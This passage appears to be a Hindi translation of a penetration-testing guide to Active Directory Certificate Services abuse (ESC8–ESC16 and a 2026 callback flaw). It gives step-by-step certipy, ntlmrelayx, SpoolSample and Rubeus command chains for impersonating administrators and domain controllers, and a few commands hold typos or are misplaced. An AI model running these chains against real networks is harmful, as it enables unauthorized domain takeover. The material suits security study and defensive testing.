Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify के साथ Abuse
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) के साथ Abuse

Certificate के लिए request डिफ़ॉल्ट रूप से Certipy द्वारा `Machine` या `User` template के आधार पर की जाती है। यह इस बात से निर्धारित होता है कि relay किए जा रहे account का नाम `$` पर समाप्त होता है या नहीं। किसी वैकल्पिक template को निर्दिष्ट करने के लिए `-template` parameter का उपयोग किया जा सकता है।

इसके बाद authentication को coerce करने के लिए [PetitPotam](https://github.com/ly4k/PetitPotam) जैसी technique का उपयोग किया जा सकता है। Domain controllers के साथ काम करते समय `-template DomainController` निर्दिष्ट करना आवश्यक है।
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### व्याख्या

**`msPKI-Enrollment-Flag`** के लिए नया मान **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`), जिसे ESC9 कहा जाता है, प्रमाणपत्र में **नई `szOID_NTDS_CA_SECURITY_EXT` security extension** को शामिल होने से रोकता है। यह flag तब प्रासंगिक हो जाता है जब `StrongCertificateBindingEnforcement` को `1` (default setting) पर सेट किया जाता है, जो `2` की setting से अलग है। इसका महत्व उन स्थितियों में बढ़ जाता है जहाँ Kerberos या Schannel के लिए कमजोर certificate mapping का शोषण किया जा सकता है (जैसा कि ESC10 में), क्योंकि ESC9 की अनुपस्थिति आवश्यकताओं में कोई बदलाव नहीं करती।<sup>[[7]](#references)</sup>

जिन परिस्थितियों में इस flag की setting महत्वपूर्ण हो जाती है, उनमें शामिल हैं:

- `StrongCertificateBindingEnforcement` को `2` पर adjust नहीं किया गया है (default `1` है), या `CertificateMappingMethods` में `UPN` flag शामिल है।
- प्रमाणपत्र को `msPKI-Enrollment-Flag` setting में `CT_FLAG_NO_SECURITY_EXTENSION` flag के साथ चिह्नित किया गया है।
- प्रमाणपत्र में कोई भी client authentication EKU निर्दिष्ट है।
- किसी अन्य account को compromise करने के लिए किसी भी account पर `GenericWrite` permissions उपलब्ध हैं।

### Abuse Scenario

मान लें कि `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` permissions हैं और लक्ष्य `Administrator@corp.local` को compromise करना है। `ESC9` certificate template, जिसमें `Jane@corp.local` को enroll करने की अनुमति है, अपनी `msPKI-Enrollment-Flag` setting में `CT_FLAG_NO_SECURITY_EXTENSION` flag के साथ configured है।

सबसे पहले, `John` के `GenericWrite` की सहायता से Shadow Credentials का उपयोग करके `Jane` का hash प्राप्त किया जाता है:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
इसके बाद, `Jane` का `userPrincipalName` बदलकर `Administrator` कर दिया जाता है, जिसमें जानबूझकर `@corp.local` domain भाग को छोड़ दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
यह संशोधन constraints का उल्लंघन नहीं करता, क्योंकि `Administrator@corp.local`, `Administrator` के `userPrincipalName` के रूप में अलग बना रहता है।

इसके बाद, vulnerable के रूप में चिह्नित `ESC9` certificate template को `Jane` के रूप में request किया जाता है:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
यह नोट किया गया है कि certificate का `userPrincipalName` `Administrator` को दर्शाता है, जिसमें कोई “object SID” नहीं है।

इसके बाद `Jane` का `userPrincipalName` उसके मूल मान, `Jane@corp.local`, पर वापस बदल दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
जारी किए गए certificate के साथ authentication का प्रयास करने पर अब `Administrator@corp.local` का NT hash प्राप्त होता है। certificate में domain specification न होने के कारण command में `-domain <domain>` शामिल करना आवश्यक है:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

ESC10 domain controller पर दो registry key values को संदर्भित करता है:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` के अंतर्गत `CertificateMappingMethods` की default value `0x18` (`0x8 | 0x10`) है, जिसे पहले `0x1F` पर सेट किया गया था।
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` के अंतर्गत `StrongCertificateBindingEnforcement` की default setting `1` है, जो पहले `0` थी।<sup>[[7]](#references)</sup>

**मामला 1**

जब `StrongCertificateBindingEnforcement` को `0` के रूप में configure किया गया हो।

**मामला 2**

यदि `CertificateMappingMethods` में `UPN` bit (`0x4`) शामिल हो।

### Abuse Case 1

`StrongCertificateBindingEnforcement` को `0` के रूप में configure किए जाने पर, `GenericWrite` permissions वाला account A किसी भी account B को compromise करने के लिए exploit किया जा सकता है।

उदाहरण के लिए, `Jane@corp.local` पर `GenericWrite` permissions होने पर attacker का लक्ष्य `Administrator@corp.local` को compromise करना है। यह procedure ESC9 के समान है, जिसमें किसी भी certificate template का उपयोग किया जा सकता है।

सबसे पहले, `GenericWrite` का exploitation करते हुए Shadow Credentials के माध्यम से `Jane` का hash प्राप्त किया जाता है।
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
इसके बाद, constraint violation से बचने के लिए `Jane` का `userPrincipalName` बदलकर `Administrator` कर दिया जाता है, जिसमें जानबूझकर `@corp.local` वाला भाग छोड़ दिया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
इसके बाद, client authentication सक्षम करने वाला certificate, default `User` template का उपयोग करके `Jane` के रूप में request किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` फिर उसके मूल `Jane@corp.local` पर वापस कर दिया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
प्राप्त certificate के साथ authenticate करने पर `Administrator@corp.local` का NT hash प्राप्त होगा। Certificate में domain details न होने के कारण command में domain निर्दिष्ट करना आवश्यक है।
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

`CertificateMappingMethods` में `UPN` bit flag (`0x4`) होने पर, `GenericWrite` permissions वाला account A, ऐसे किसी भी account B को compromise कर सकता है जिसमें `userPrincipalName` property नहीं है, जिसमें machine accounts और built-in domain administrator `Administrator` भी शामिल हैं।

यहाँ लक्ष्य `DC$@corp.local` को compromise करना है। इसकी शुरुआत `GenericWrite` का लाभ उठाकर Shadow Credentials के माध्यम से `Jane` का hash प्राप्त करने से की जाती है।
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` का `userPrincipalName` फिर `DC$@corp.local` पर सेट कर दिया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
डिफ़ॉल्ट `User` template का उपयोग करके `Jane` के रूप में client authentication के लिए एक certificate का अनुरोध किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` इस प्रक्रिया के बाद अपने मूल मान पर वापस आ जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel के माध्यम से authenticate करने के लिए Certipy का `-ldap-shell` option उपयोग किया जाता है, जो `u:CORP\DC$` के रूप में authentication की सफलता दर्शाता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell के माध्यम से, `set_rbcd` जैसे commands Resource-Based Constrained Delegation (RBCD) attacks को enable करते हैं, जिससे domain controller को संभावित रूप से compromise किया जा सकता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
यह vulnerability किसी भी ऐसे user account तक भी विस्तारित होती है जिसमें `userPrincipalName` नहीं है या जहाँ यह `sAMAccountName` से मेल नहीं खाता। डिफ़ॉल्ट `Administrator@corp.local` एक प्रमुख target है, क्योंकि इसके पास elevated LDAP privileges होते हैं और डिफ़ॉल्ट रूप से इसमें `userPrincipalName` नहीं होता।

## Relaying NTLM to ICPR - ESC11

### व्याख्या

यदि CA Server को `IF_ENFORCEENCRYPTICERTREQUEST` के साथ configure नहीं किया गया है, तो RPC service के माध्यम से signing के बिना NTLM relay attacks किए जा सकते हैं। [यहाँ Reference](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

आप `certipy` का उपयोग करके enumerate कर सकते हैं कि `Enforce Encryption for Requests` Disabled है या नहीं, और certipy `ESC11` Vulnerabilities दिखाएगा।
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### दुरुपयोग परिदृश्य

एक relay server सेट अप करना आवश्यक है:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
नोट: domain controllers के लिए, DomainController में `-template` निर्दिष्ट करना आवश्यक है।

या [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) का उपयोग करके:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## ADCS CA तक Shell access with YubiHSM - ESC12

### Explanation

Administrators Certificate Authority को इस तरह configure कर सकते हैं कि वह इसे "Yubico YubiHSM2" जैसे external device पर store करे।

यदि USB device को CA server से USB port के माध्यम से connect किया गया है, या CA server के virtual machine होने की स्थिति में USB device server का उपयोग किया गया है, तो YubiHSM में keys को generate और उपयोग करने के लिए Key Storage Provider को एक authentication key (जिसे कभी-कभी "password" भी कहा जाता है) की आवश्यकता होती है।

यह key/password registry में `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` के अंतर्गत cleartext में stored होती है।

Reference [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Scenario

यदि CA की private key किसी physical USB device पर stored है और आपको shell access मिल जाता है, तो key को recover करना संभव है।

सबसे पहले, आपको CA certificate प्राप्त करना होगा (यह public होता है) और फिर:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
अंत में, CA certificate और उसकी private key का उपयोग करके एक नया arbitrary certificate forge करने के लिए certutil `-sign` command का उपयोग करें।

## OID Group Link Abuse - ESC13

### व्याख्या

`msPKI-Certificate-Policy` attribute certificate template में issuance policy जोड़ने की अनुमति देता है। Issuance policies जारी करने के लिए जिम्मेदार `msPKI-Enterprise-Oid` objects को PKI OID container के Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) में खोजा जा सकता है। किसी policy को इस object के `msDS-OIDToGroupLink` attribute का उपयोग करके AD group से link किया जा सकता है, जिससे system certificate प्रस्तुत करने वाले user को ऐसा authorize कर सकता है जैसे वह उस group का member हो। [यहां reference देखें](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

दूसरे शब्दों में, जब किसी user के पास certificate enroll करने की permission होती है और certificate किसी OID group से link होता है, तो user इस group के privileges inherit कर सकता है।

OIDToGroupLink खोजने के लिए [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) का उपयोग करें:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

ऐसी user permission खोजें जिसका उपयोग `certipy find` या `Certify.exe find /showAllPermissions` कर सके।

यदि `John` के पास `VulnerableTemplate` में enroll करने की permission है, तो user `VulnerableGroup` group के privileges inherit कर सकता है।

उसे केवल template specify करना होगा; उसे OIDToGroupLink rights वाला certificate मिल जाएगा।
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## कमजोर Certificate Renewal Configuration- ESC14

### व्याख्या

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping पर दिया गया विवरण उल्लेखनीय रूप से व्यापक है। नीचे मूल पाठ का उद्धरण दिया गया है।<sup>[[14]](#references)</sup>

ESC14 "कमजोर explicit certificate mapping" से उत्पन्न vulnerabilities को संबोधित करता है, मुख्य रूप से Active Directory user या computer accounts पर `altSecurityIdentities` attribute के दुरुपयोग या असुरक्षित configuration के माध्यम से। यह multi-valued attribute administrators को authentication purposes के लिए X.509 certificates को किसी AD account से manually associate करने की अनुमति देता है। जब यह populated होता है, तो ये explicit mappings default certificate mapping logic को override कर सकते हैं, जो आमतौर पर certificate के SAN में UPNs या DNS names, या `szOID_NTDS_CA_SECURITY_EXT` security extension में embedded SID पर निर्भर करता है।

"कमजोर" mapping तब होती है जब `altSecurityIdentities` attribute के भीतर certificate की पहचान करने के लिए उपयोग की जाने वाली string value बहुत व्यापक हो, आसानी से guess की जा सके, non-unique certificate fields पर निर्भर हो, या आसानी से spoof किए जा सकने वाले certificate components का उपयोग करे। यदि attacker ऐसा certificate प्राप्त या craft कर सकता है जिसके attributes किसी privileged account के लिए कमजोर रूप से defined explicit mapping से match करते हों, तो वह उस certificate का उपयोग करके उस account के रूप में authenticate और impersonate कर सकता है।

संभावित रूप से कमजोर `altSecurityIdentities` mapping strings के उदाहरणों में शामिल हैं:

- केवल एक common Subject Common Name (CN) के आधार पर mapping: जैसे, `X509:<S>CN=SomeUser`। Attacker कम सुरक्षित source से इस CN वाला certificate प्राप्त करने में सक्षम हो सकता है।
- बिना किसी अतिरिक्त qualification, जैसे specific serial number या subject key identifier, के अत्यधिक generic Issuer Distinguished Names (DNs) या Subject DNs का उपयोग: जैसे, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`।
- अन्य predictable patterns या non-cryptographic identifiers का उपयोग, जिन्हें attacker ऐसे certificate में satisfy करने में सक्षम हो सकता है जिसे वह legitimately obtain या forge कर सकता है (यदि उसने किसी CA को compromise कर लिया हो या ESC1 की तरह कोई vulnerable template ढूंढ लिया हो)।

`altSecurityIdentities` attribute mapping के लिए विभिन्न formats को support करता है, जैसे:

- `X509:<I>IssuerDN<S>SubjectDN` (full Issuer और Subject DN के आधार पर mapping)
- `X509:<SKI>SubjectKeyIdentifier` (certificate के Subject Key Identifier extension value के आधार पर mapping)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number के आधार पर mapping, जिसे Issuer DN implicitly qualify करता है) - यह standard format नहीं है; आमतौर पर यह `<I>IssuerDN<SR>SerialNumber` होता है।
- `X509:<RFC822>EmailAddress` (SAN से RFC822 name, आमतौर पर email address, के आधार पर mapping)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate की raw public key के SHA1 hash के आधार पर mapping - सामान्यतः मजबूत)

इन mappings की security mapping string में उपयोग किए गए चुने गए certificate identifiers की specificity, uniqueness और cryptographic strength पर बहुत अधिक निर्भर करती है। Domain Controllers पर strong certificate binding modes enabled होने पर भी (जो मुख्य रूप से SAN UPNs/DNS और SID extension पर आधारित implicit mappings को प्रभावित करते हैं), poorly configured `altSecurityIdentities` entry फिर भी impersonation के लिए direct path प्रस्तुत कर सकती है, यदि mapping logic स्वयं flawed या अत्यधिक permissive हो।
### Abuse Scenario

ESC14 Active Directory (AD) में **explicit certificate mappings**, विशेष रूप से `altSecurityIdentities` attribute, को target करता है। यदि यह attribute set है (design या misconfiguration के कारण), तो attackers mapping से match करने वाले certificates प्रस्तुत करके accounts को impersonate कर सकते हैं।

#### Scenario A: Attacker `altSecurityIdentities` में लिख सकता है

**Precondition**: Attacker के पास target account के `altSecurityIdentities` attribute पर write permissions हैं या target AD object पर निम्न में से किसी एक permission के रूप में इसे grant करने की permission है:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*।
#### Scenario B: Target के पास X509RFC822 (Email) के माध्यम से कमजोर mapping है

- **Precondition**: Target के पास `altSecurityIdentities` में कमजोर X509RFC822 mapping है। Attacker victim के mail attribute को target के X509RFC822 name से match करने के लिए set कर सकता है, victim के रूप में certificate enroll कर सकता है, और target के रूप में authenticate करने के लिए इसका उपयोग कर सकता है।
#### Scenario C: Target के पास X509IssuerSubject mapping है

- **Precondition**: Target के पास `altSecurityIdentities` में कमजोर X509IssuerSubject explicit mapping है। Attacker victim principal पर `cn` या `dNSHostName` attribute को target की X509IssuerSubject mapping के subject से match करने के लिए set कर सकता है। फिर attacker victim के रूप में certificate enroll कर सकता है और target के रूप में authenticate करने के लिए इस certificate का उपयोग कर सकता है।
#### Scenario D: Target के पास X509SubjectOnly mapping है

- **Precondition**: Target के पास `altSecurityIdentities` में कमजोर X509SubjectOnly explicit mapping है। Attacker victim principal पर `cn` या `dNSHostName` attribute को target की X509SubjectOnly mapping के subject से match करने के लिए set कर सकता है। फिर attacker victim के रूप में certificate enroll कर सकता है और target के रूप में authenticate करने के लिए इस certificate का उपयोग कर सकता है।
### ठोस operations
#### Scenario A

Certificate template `Machine` का certificate request करें
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Certificate को save और convert करें
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Authenticate (certificate का उपयोग करके)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
सफाई (वैकल्पिक)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
अधिक विशिष्ट attack methods और विभिन्न attack scenarios के लिए, कृपया निम्नलिखित देखें: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)।<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### विवरण

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc पर दिया गया विवरण उल्लेखनीय रूप से thorough है। नीचे original text का quotation दिया गया है।<sup>[[15]](#references)</sup>

Built-in default version 1 certificate templates का उपयोग करके, attacker एक CSR तैयार कर सकता है जिसमें application policies शामिल हों, जिन्हें template में निर्दिष्ट configured Extended Key Usage attributes की तुलना में प्राथमिकता दी जाती है। केवल enrollment rights की आवश्यकता होती है, और इसका उपयोग **_WebServer_** template का उपयोग करके client authentication, certificate request agent और codesigning certificates generate करने के लिए किया जा सकता है।

### Abuse

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) में अधिक विस्तृत usage examples शामिल हैं।<sup>[[14]](#references)</sup>


यदि CA unpatched है, तो Certipy का `find` command उन V1 templates की पहचान करने में सहायता कर सकता है जो संभावित रूप से ESC15 के प्रति susceptible हैं।
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direct Impersonation via Schannel

**Step 1: Certificate request करें, जिसमें "Client Authentication" Application Policy और target UPN inject किया जाए।** Attacker `attacker@corp.local`, "WebServer" V1 template का उपयोग करके `administrator@corp.local` को target करता है (जो enrollee-supplied subject की अनुमति देता है)।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" वाला vulnerable V1 template।
- `-application-policies 'Client Authentication'`: CSR के Application Policies extension में OID `1.3.6.1.5.5.7.3.2` inject करता है।
- `-upn 'administrator@corp.local'`: impersonation के लिए SAN में UPN सेट करता है।

**Step 2: प्राप्त certificate का उपयोग करके Schannel (LDAPS) के माध्यम से authenticate करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Step 1: V1 template से certificate request करें (जिसमें "Enrollee supplies subject" हो), और "Certificate Request Agent" Application Policy inject करें।** यह certificate attacker (`attacker@corp.local`) के लिए enrollment agent बनने हेतु है। यहां attacker की अपनी identity के लिए कोई UPN निर्दिष्ट नहीं किया गया है, क्योंकि लक्ष्य agent capability प्राप्त करना है।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` inject करता है।

**चरण 2: लक्षित privileged user की ओर से certificate का अनुरोध करने के लिए "agent" certificate का उपयोग करें।** यह ESC3-जैसा चरण है, जिसमें चरण 1 के certificate को agent certificate के रूप में उपयोग किया जाता है।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Step 3: "on-behalf-of" certificate का उपयोग करके privileged user के रूप में authenticate करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA पर Security Extension Disabled (Globally)-ESC16

### व्याख्या

**ESC16 (Missing szOID_NTDS_CA_SECURITY_EXT Extension के कारण Elevation of Privilege)** उस स्थिति को संदर्भित करता है, जहाँ यदि AD CS का configuration सभी certificates में **szOID_NTDS_CA_SECURITY_EXT** extension को शामिल करना अनिवार्य नहीं बनाता है, तो attacker इसका फायदा उठाकर:

1. **SID binding के बिना** certificate request कर सकता है।

2. इस certificate का उपयोग **किसी भी account के रूप में authentication** करने के लिए कर सकता है, जैसे किसी high-privilege account (उदाहरण के लिए, Domain Administrator) का impersonation करना।

विस्तृत principle के बारे में अधिक जानने के लिए आप इस article को भी देख सकते हैं:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### दुरुपयोग

निम्नलिखित [इस link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) में referenced है। अधिक विस्तृत usage methods देखने के लिए Click करें।<sup>[[14]](#references)</sup>

यह पहचानने के लिए कि Active Directory Certificate Services (AD CS) environment **ESC16** के प्रति vulnerable है,
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**चरण 1: पीड़ित account का initial UPN पढ़ें (वैकल्पिक - restoration के लिए)।
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**चरण 2: victim account के UPN को target administrator के `sAMAccountName` पर अपडेट करें।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**चरण 3: (यदि आवश्यक हो) "victim" account के लिए credentials प्राप्त करें (जैसे, Shadow Credentials के माध्यम से)।**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**चरण 4: ESC16-vulnerable CA पर _any suitable client authentication template_ (जैसे, "User") से "victim" user के रूप में certificate request करें।** क्योंकि CA ESC16 के प्रति vulnerable है, इसलिए template की इस extension के लिए specific settings की परवाह किए बिना, यह जारी किए गए certificate से SID security extension को अपने-आप हटा देगा। Kerberos credential cache environment variable सेट करें (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
फिर certificate का अनुरोध करें:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**चरण 5: "victim" account का UPN वापस बदलें।**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**चरण 6: target administrator के रूप में Authenticate करें।**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Explanation

**Certighost** एक **AD CS enrollment chase / callback path** का दुरुपयोग करता है, जिसमें CA जारी किए जाने वाले certificate में रखी जाने वाली identity को निर्धारित करने के लिए requester द्वारा दिए गए request attributes पर भरोसा करता है। Public PoC में crafted request में ये शामिल होते हैं:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: attacker-controlled host/IP, जिससे CA संपर्क करेगा
- **`rmd`**: impersonate किए जाने वाले **target Domain Controller DNS name**

यदि CA उस chase का अनुसरण करता है, तो वह **SMB/LSA (`445`)** और **LDAP (`389`)** के माध्यम से attacker से connect करेगा। Attacker एक **real machine account** का उपयोग करता है, जो आमतौर पर default **`ms-DS-MachineAccountQuota`** के माध्यम से बनाया जाता है, ताकि callback session एक valid domain principal के रूप में authenticate हो। हालांकि, rogue services इसके बजाय **target DC** के identity attributes लौटाती हैं:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

यदि CA **returned identity को authenticated callback principal के साथ cryptographically bind नहीं करता**, तो वह **Domain Controller** के लिए certificate जारी कर सकता है, भले ही session attacker-controlled machine account के रूप में authenticated हो। इससे यह bug **Certifried** से वैचारिक रूप से अलग है: AD attributes जैसे `dNSHostName` को rewrite करने के बजाय, attacker **CA callback resolution के दौरान identity data को substitute करता है**।<sup>[[2]](#references)</sup>

**उपयोगी preconditions:**

- कम-अधिकार वाले **domain credentials**
- **computer account create या reuse** करने की क्षमता
- **CA** से attacker-controlled **ports `389` और `445`** तक network reachability
- Vulnerable / unpatched CA request path (**July 14, 2026** के Microsoft update में **`cdc` के लिए DC validation** और **resolved-SID comparison** जोड़ा गया)

इसके बाद प्राप्त **`.pfx`** का उपयोग **PKINIT** के लिए किया जा सकता है, जिससे **`.ccache`** और published PoC flow में **target DC NT hash** प्राप्त होता है। यह सामान्यतः **full domain compromise** के लिए पर्याप्त होता है।

### Abuse

Public PoC पूरी chain को automate करता है:<sup>[[1]](#references)</sup>

1. Attacker-controlled **machine account** create या reuse करें।
2. `389` और `445` पर **rogue LDAP और SMB/LSA listeners** शुरू करें।
